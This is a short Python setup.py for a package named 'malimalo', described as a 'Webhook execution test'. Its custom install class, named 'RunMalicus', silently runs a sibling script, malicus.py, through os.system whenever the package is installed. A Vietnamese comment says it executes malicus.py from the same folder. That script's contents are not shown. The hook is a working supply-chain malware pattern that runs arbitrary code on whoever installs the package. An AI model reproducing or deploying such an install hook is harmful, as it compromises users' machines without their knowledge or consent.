from setuptools import setup
from setuptools.command.install import install
import os
import sys

class RunMalicus(install):
    def run(self):
        # Thực thi file malicus.py trong cùng thư mục
        os.system(f'{sys.executable} "{os.path.join(os.path.dirname(__file__), "malicus.py")}"')
        install.run(self)

setup(
    name='malimalo',
    version='0.0.1',
    description='Webhook execution test',
    py_modules=["malimalo"],
    install_requires=["requests"],
    cmdclass={'install': RunMalicus},
)
